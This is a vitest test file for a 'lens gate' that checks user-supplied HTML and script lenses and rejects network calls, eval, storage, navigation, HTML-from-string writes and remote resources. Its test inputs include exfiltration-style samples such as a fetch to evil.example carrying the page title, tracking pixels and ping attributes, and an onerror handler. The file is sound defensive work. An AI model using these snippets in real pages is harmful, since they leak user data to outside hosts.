import { readFileSync } from "node:fs"
import path from "node:path"
import { describe, expect, it } from "vitest"
import { code_only, gate_problem, hardcoded_colors } from "../../src/shared/lens_gate"

const TOKENS_ONLY = "<style>body { color: var(--text); background: var(--bg); border: 1px solid var(--line); white-space: nowrap }</style>"

function lens(script: string, extra = ""): string {
  return `<!doctype html><html><head>${TOKENS_ONLY}</head><body>${extra}<main id="items"></main><script>${script}</script></body></html>`
}

describe("the static lens gate", () => {
  it("passes a lens that only talks to moi and uses the shared tokens", () => {
    const script = `
      const root = document.getElementById("items") // fetch( in a comment is fine
      /* so is eval( here */
      function open(item) { moi.open(item.item_id) }
      moi.on_render((items) => { root.innerHTML = ""; for (const { item } of items) { const node = document.createElement("div"); node.textContent = item.title; node.onclick = () => open(item); root.append(node) } })
      moi.ready()`
    expect(gate_problem(lens(script))).toBeNull()
    expect(gate_problem(lens("const link = 'https://example.com/a'; moi.ready()"))).toBeNull()
  })

  it.each([
    ["fetch('https://evil.example/' + document.title)", "uses fetch"],
    ["window.fetch('x')", "uses fetch"],
    ["new XMLHttpRequest()", "uses XMLHttpRequest"],
    ["new WebSocket('wss://x')", "uses WebSocket"],
    ["new EventSource('/x')", "uses EventSource"],
    ["new RTCPeerConnection()", "uses RTCPeerConnection"],
    ["navigator.sendBeacon('/x', 'y')", "uses navigator.sendBeacon"],
    ["eval('1+1')", "uses eval"],
    ["new Function('return 1')()", "builds code from a string with Function"],
    ["setTimeout('alert(1)', 10)", "passes code as a string to a timer"],
    ["localStorage.setItem('a', 'b')", "uses storage"],
    ["indexedDB.open('x')", "uses storage"],
    ["caches.open('x')", "uses storage"],
    ["document.cookie = 'a=b'", "uses cookies"],
    ["window.open('https://x')", "opens windows"],
    ["location = 'https://x'", "navigates"],
    ["location.href = 'https://x'", "navigates"],
    ["window.location.assign('https://x')", "navigates"],
    ["import('https://x/mod.js')", "imports code"],
    ["new Worker('w.js')", "starts workers"],
    ["navigator.serviceWorker.register('/sw.js')", "starts workers"],
    ["require('fs')", "reaches for Node or Electron"],
    ["process.env.HOME", "reaches for Node or Electron"],
    ["document.write('<p>hi</p>')", "uses document.write"],
    ["node.innerHTML = item.text", "writes HTML from strings (set text with textContent)"],
    ["node.innerHTML += item.text", "writes HTML from strings (set text with textContent)"],
    ["node.insertAdjacentHTML('beforeend', item.text)", "writes HTML from strings (set text with textContent)"],
    ["node.innerHTML = \"\" + item.title", "writes HTML from strings (set text with textContent)"],
    ["node.outerHTML += item.title", "writes HTML from strings (set text with textContent)"],
    ["Object.assign(node, { innerHTML: item.title })", "writes HTML from strings (set text with textContent)"],
    ["node['inner' + 'HTML']; node.setHTMLUnsafe(item.title)", "writes HTML from strings (set text with textContent)"],
    ["document.createRange().createContextualFragment(item.title)", "writes HTML from strings (set text with textContent)"],
    ["new DOMParser().parseFromString(item.text, 'text/html')", "writes HTML from strings (set text with textContent)"],
  ])("refuses script that %s", (script, problem) => {
    expect(gate_problem(lens(script))).toBe(`the lens ${problem}, which lenses may not do`)
  })

  it("does not flag comparisons, method names or the lens's own open function", () => {
    expect(gate_problem(lens("if (location == 'x' || node.textContent === '') moi.ready(); const reopen = (id) => moi.open(id)"))).toBeNull()
    expect(gate_problem(lens("const prefetch = 1; my.fetcher(); thing.eval_score = 2; moi.ready()"))).toBeNull()
  })

  it.each([
    ['<form action="/x"></form>', "has a form, frame, object, embed or base tag"],
    ['<iframe src="data:text/html,hi"></iframe>', "has a form, frame, object, embed or base tag"],
    ['<base href="/">', "has a form, frame, object, embed or base tag"],
    ['<link rel="prefetch" href="/x">', "has a link tag"],
    ['<script src="x.js"></script>', "loads a script file"],
    ['<meta http-equiv="refresh" content="0;url=/x">', "refreshes or redirects with a meta tag"],
    ['<img src="https://evil.example/pixel.png">', "points at an address elsewhere"],
    ["<img src='//evil.example/p.png'>", "points at an address elsewhere"],
    ['<a href="https://example.com" ping="https://evil.example">x</a>', "points at an address elsewhere"],
    ['<div style="background: url(https://evil.example/x.png)"></div>', "loads CSS from an address elsewhere"],
    ["<style>@import 'x.css';</style>", "imports CSS"],
  ])("refuses markup %s", (markup, problem) => {
    expect(gate_problem(lens("moi.ready()", markup))).toBe(`the lens ${problem}, which lenses may not do`)
  })

  it("refuses inline event handler attributes, whatever they do", () => {
    expect(gate_problem(lens("moi.ready()", `<button onclick="moi.open('a')">x</button>`))).toBe("the lens has an inline event handler attribute (use addEventListener), which lenses may not do")
    expect(gate_problem(lens("moi.ready()", `<img alt="" src="data:image/gif;base64,R0" ONERROR="x()">`))).toContain("inline event handler")
    expect(gate_problem(lens("button.onclick = () => moi.open('a'); root.innerHTML = ''; moi.ready()"))).toBeNull()
  })

  it("refuses colors that do not come from the shared tokens", () => {
    expect(hardcoded_colors("a { color: #333 } b { background: rgba(0, 0, 0, 0.2) } c { border: 1px solid white } :root { --x: hsl(0 0% 0%) }")).toEqual([
      "color: #333",
      "background: rgba(0, 0, 0, 0.2)",
      "border: 1px solid white",
      "--x: hsl(0 0% 0%)",
    ])
    expect(hardcoded_colors("a { color: var(--text); white-space: nowrap; background: transparent; outline: none } /* color: #fff */")).toEqual([])
    expect(gate_problem(lens("moi.ready()", '<p style="color: #f00">x</p>'))).toBe("the lens hardcodes a color (color: #f00); use the shared tokens such as var(--text), var(--muted), var(--accent)")
  })

  it("refuses a lens too large to be a lens", () => {
    expect(gate_problem(lens("moi.ready()", "x".repeat(400_001)))).toBe("the lens is larger than 400 kB")
  })

  it("passes the default lens, which takes every color from the shared tokens", () => {
    const default_lens = readFileSync(path.resolve(__dirname, "..", "..", "..", "lenses", "default", "default.html"), "utf-8")
    expect(gate_problem(default_lens)).toBeNull()
    const tokens = readFileSync(path.resolve(__dirname, "..", "..", "..", "lenses", "tokens.css"), "utf-8")
    expect(hardcoded_colors(tokens).length).toBeGreaterThan(5)
  })

  it("keeps addresses inside strings when it drops comments", () => {
    expect(code_only("const a = 'https://x' // fetch(\nb()")).toBe("const a = 'https://x'  \nb()")
  })
})
